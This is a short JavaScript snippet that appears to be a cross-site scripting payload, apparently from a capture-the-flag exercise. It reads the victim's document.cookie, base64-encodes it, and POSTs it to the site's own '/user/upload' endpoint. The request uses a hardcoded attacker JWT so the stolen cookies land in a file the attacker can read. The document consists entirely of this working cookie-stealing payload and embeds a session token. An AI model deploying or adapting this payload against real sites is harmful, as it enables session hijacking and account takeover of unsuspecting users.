fetch("/user/upload", {
  method: "POST",
  headers: {
    "Content-Type": "text/plain",
    "Cookie": "dream-token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY4NTYxNjkyNywianRpIjoiMWQ4NTEyN2QtM2Y5Ny00NWNiLWFlNGUtZmY1ODIzNWQ1MDEzIiwibmJmIjoxNjg1NjE2OTI3LCJ0eXBlIjoiYWNjZXNzIiwic3ViIjoyLCJleHAiOjE2ODU2MTc4Mjd9.GPwFvuv1mL7H6MB3zbUG38CLjIUe0szON63bcVQSJzA"
  },
  body: "filename=asdf&data="+btoa(document.cookie),
}).then(e=>e.text()).then(e=>{console.log(e)})
  
